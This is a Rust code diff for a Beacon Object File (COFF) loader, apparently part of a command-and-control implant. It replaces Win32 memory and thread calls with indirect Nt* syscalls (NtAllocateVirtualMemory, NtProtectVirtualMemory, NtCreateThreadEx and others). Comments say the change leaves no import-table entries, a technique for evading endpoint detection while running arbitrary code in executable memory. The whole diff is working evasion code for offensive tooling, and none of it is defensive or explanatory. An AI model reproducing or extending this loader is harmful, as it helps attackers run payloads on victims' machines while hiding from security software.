@@ -40,12 +40,12 @@ use std::sync::atomic::{AtomicPtr, AtomicUsize, Ordering};
 use winapi::shared::minwindef::{DWORD, LPVOID, UINT};
 use winapi::shared::ntdef::HRESULT;
 use winapi::shared::winerror::S_OK;
-use winapi::um::handleapi::CloseHandle;
+// CloseHandle removed — using NtClose indirect syscall
 use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
-use winapi::um::memoryapi::{VirtualAlloc, VirtualFree, VirtualProtect};
-use winapi::um::processthreadsapi::{CreateThread, WaitForSingleObject};
+// VirtualAlloc/VirtualFree/VirtualProtect removed — using Nt* indirect syscalls
+// CreateThread/WaitForSingleObject removed — using NtCreateThreadEx/NtWaitForSingleObject indirect syscalls
 use winapi::um::synchapi::CreateEventW;
-use winapi::um::winbase::{INFINITE, WAIT_OBJECT_0};
+use winapi::um::winbase::WAIT_OBJECT_0;
 use winapi::um::winnt::{
     MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
     PAGE_READWRITE, PVOID,
@@ -828,15 +828,22 @@ pub unsafe fn execute_bof(
     );
 
     // ── Allocate memory ─────────────────────────────────────────────────
-    let base = VirtualAlloc(
-        std::ptr::null_mut(),
-        total_size,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE,
+    // VirtualAlloc → NtAllocateVirtualMemory
+    let mut base_ptr: usize = 0;
+    let mut region_size = total_size;
+    let alloc_status = syscall!(
+        "NtAllocateVirtualMemory",
+        (-1isize) as u64,                    // NtCurrentProcess()
+        &mut base_ptr as *mut _ as u64,     // BaseAddress (in/out)
+        0u64,                                 // ZeroBits
+        &mut region_size as *mut _ as u64,  // RegionSize (in/out)
+        (MEM_COMMIT | MEM_RESERVE) as u64,  // AllocationType
+        PAGE_EXECUTE_READWRITE as u64,       // Protect
     );
-    if base.is_null() {
-        return Err("VirtualAlloc failed for COFF memory".to_string());
+    if alloc_status.is_err() || alloc_status.unwrap() < 0 || base_ptr == 0 {
+        return Err("NtAllocateVirtualMemory failed for COFF memory".to_string());
     }
+    let base = base_ptr as *mut c_void;
     log::info!("[coff_loader] allocated COFF memory at {:#x}", base as usize);
 
     // Zero the entire region.
@@ -990,12 +997,16 @@ pub unsafe fn execute_bof(
             PAGE_READWRITE
         };
 
+        let mut base_addr = (base as usize + offset) as *mut c_void;
+        let mut sec_size = section_size;
         let mut old_prot: u32 = 0;
-        VirtualProtect(
-            (base as usize + offset) as *mut c_void,
-            section_size,
-            prot,
-            &mut old_prot as *mut u32,
+        let _ = syscall!(
+            "NtProtectVirtualMemory",
+            (-1isize) as u64,                        // NtCurrentProcess()
+            &mut base_addr as *mut _ as u64,         // BaseAddress (in/out)
+            &mut sec_size as *mut _ as u64,          // RegionSize (in/out)
+            prot as u64,                               // NewProtect
+            &mut old_prot as *mut u32 as u64,         // OldProtect
         );
     }
 
@@ -1027,7 +1038,15 @@ pub unsafe fn execute_bof(
         Some(a) => a,
         None => {
             // Free COFF memory before returning.
-            VirtualFree(base, 0, MEM_RELEASE);
+            let mut base_addr = base as usize;
+            let mut free_size: usize = 0;
+            let _ = syscall!(
+                "NtFreeVirtualMemory",
+                (-1isize) as u64,
+                &mut base_addr as *mut _ as u64,
+                &mut free_size as *mut _ as u64,
+                MEM_RELEASE as u64,
+            );
             return Err("COFF does not contain a 'go' symbol (entry point)".to_string());
         }
     };
@@ -1038,16 +1057,30 @@ pub unsafe fn execute_bof(
         (std::ptr::null_mut(), 0i32)
     } else {
         // Allocate a buffer that the BOF can read.
-        let arg_buf = VirtualAlloc(
-            std::ptr::null_mut(),
-            packed_args.len(),
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,
+        let mut arg_buf_ptr: usize = 0;
+        let mut arg_region_size = packed_args.len();
+        let arg_alloc_status = syscall!(
+            "NtAllocateVirtualMemory",
+            (-1isize) as u64,
+            &mut arg_buf_ptr as *mut _ as u64,
+            0u64,
+            &mut arg_region_size as *mut _ as u64,
+            (MEM_COMMIT | MEM_RESERVE) as u64,
+            PAGE_READWRITE as u64,
         );
-        if arg_buf.is_null() {
-            VirtualFree(base, 0, MEM_RELEASE);
-            return Err("VirtualAlloc failed for BOF args".to_string());
+        if arg_alloc_status.is_err() || arg_alloc_status.unwrap() < 0 || arg_buf_ptr == 0 {
+            let mut base_addr = base as usize;
+            let mut free_size: usize = 0;
+            let _ = syscall!(
+                "NtFreeVirtualMemory",
+                (-1isize) as u64,
+                &mut base_addr as *mut _ as u64,
+                &mut free_size as *mut _ as u64,
+                MEM_RELEASE as u64,
+            );
+            return Err("NtAllocateVirtualMemory failed for BOF args".to_string());
         }
+        let arg_buf = arg_buf_ptr as *mut c_void;
         std::ptr::copy_nonoverlapping(
             packed_args.as_ptr(),
             arg_buf as *mut u8,
@@ -1063,27 +1096,59 @@ pub unsafe fn execute_bof(
     let timeout = timeout_secs.unwrap_or(DEFAULT_TIMEOUT_SECS);
     let go_fn: extern "C" fn(*mut u8, i32) = std::mem::transmute(go_addr);
 
-    let thread_handle = CreateThread(
-        std::ptr::null_mut(),
-        0,
-        Some(std::mem::transmute(go_fn as *const c_void)),
-        args_ptr as *mut c_void,
-        0,
-        std::ptr::null_mut(),
+    // CreateThread → NtCreateThreadEx (indirect syscall, no IAT entry)
+    let mut thread_handle_raw: usize = 0;
+    let thread_status = syscall!(
+        "NtCreateThreadEx",
+        &mut thread_handle_raw as *mut _ as u64, // ThreadHandle
+        0x1FFFFFu64,                               // THREAD_ALL_ACCESS
+        std::ptr::null::<u64>() as u64,            // ObjectAttributes
+        (-1isize) as u64,                          // NtCurrentProcess()
+        Some(std::mem::transmute(go_fn as *const c_void)) as *const _ as u64, // StartRoutine
+        args_ptr as *mut c_void as u64,            // Argument
+        0u64,                                      // CreateSuspended
+        0u64,                                      // ZeroBits
+        0u64,                                      // StackSize
+        0u64,                                      // MaxStackSize
+        std::ptr::null::<u64>() as u64,            // AttributeSet
     );
 
-    if thread_handle.is_null() {
+    if thread_status.is_err() || thread_status.unwrap() < 0 || thread_handle_raw == 0 {
         // Cleanup.
         if !args_ptr.is_null() {
-            VirtualFree(args_ptr as *mut c_void, 0, MEM_RELEASE);
+            let mut arg_addr = args_ptr as usize;
+            let mut free_sz: usize = 0;
+            let _ = syscall!(
+                "NtFreeVirtualMemory",
+                (-1isize) as u64,
+                &mut arg_addr as *mut _ as u64,
+                &mut free_sz as *mut _ as u64,
+                MEM_RELEASE as u64,
+            );
         }
-        VirtualFree(base, 0, MEM_RELEASE);
-        return Err("CreateThread failed for BOF execution".to_string());
+        let mut base_addr = base as usize;
+        let mut free_size: usize = 0;
+        let _ = syscall!(
+            "NtFreeVirtualMemory",
+            (-1isize) as u64,
+            &mut base_addr as *mut _ as u64,
+            &mut free_size as *mut _ as u64,
+            MEM_RELEASE as u64,
+        );
+        return Err("NtCreateThreadEx failed for BOF execution".to_string());
     }
+    let thread_handle = thread_handle_raw as *mut c_void;
 
     // Wait with timeout.
-    let wait_result = WaitForSingleObject(thread_handle, (timeout * 1000) as u32);
-    let timed_out = wait_result != WAIT_OBJECT_0;
+    // WaitForSingleObject → NtWaitForSingleObject (indirect syscall)
+    let timeout_100ns: i64 = -((timeout as i64) * 10_000_000);
+    let wait_status = syscall!(
+        "NtWaitForSingleObject",
+        thread_handle as u64,
+        0u64, // Alertable = FALSE
+        &timeout_100ns as *const _ as u64,
+    );
+    let timed_out = wait_status.is_err() || wait_status.unwrap() != 0;
 
     if timed_out {
         log::warn!("[coff_loader] BOF timed out after {}s", timeout);
@@ -1096,18 +1161,35 @@ pub unsafe fn execute_bof(
     let output = String::from_utf8_lossy(&output_bytes).to_string();
 
     // ── Cleanup ─────────────────────────────────────────────────────────
-    CloseHandle(thread_handle);
+    // CloseHandle → NtClose
+    let _ = syscall!("NtClose", thread_handle as u64);
 
     // Free args buffer.
     if !args_ptr.is_null() {
         // Zero args before freeing.
         std::ptr::write_bytes(args_ptr, 0, args_len as usize);
-        VirtualFree(args_ptr as *mut c_void, 0, MEM_RELEASE);
+        let mut arg_addr = args_ptr as usize;
+        let mut free_sz: usize = 0;
+        let _ = syscall!(
+            "NtFreeVirtualMemory",
+            (-1isize) as u64,
+            &mut arg_addr as *mut _ as u64,
+            &mut free_sz as *mut _ as u64,
+            MEM_RELEASE as u64,
+        );
     }
 
     // Zero and free COFF memory.
     std::ptr::write_bytes(base as *mut u8, 0, total_size);
-    VirtualFree(base, 0, MEM_RELEASE);
+    let mut base_addr = base as usize;
+    let mut free_size: usize = 0;
+    let _ = syscall!(
+        "NtFreeVirtualMemory",
+        (-1isize) as u64,
+        &mut base_addr as *mut _ as u64,
+        &mut free_size as *mut _ as u64,
+        MEM_RELEASE as u64,
+    );
 
     // Free output buffer.
     free_output_buffer();
